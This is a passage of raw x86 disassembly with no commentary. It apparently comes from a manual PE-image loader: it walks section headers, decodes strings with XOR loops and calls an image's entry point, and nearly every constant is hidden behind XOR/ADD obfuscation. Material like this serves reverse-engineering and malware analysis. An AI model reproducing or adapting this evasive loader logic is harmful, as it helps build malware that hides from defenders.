  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
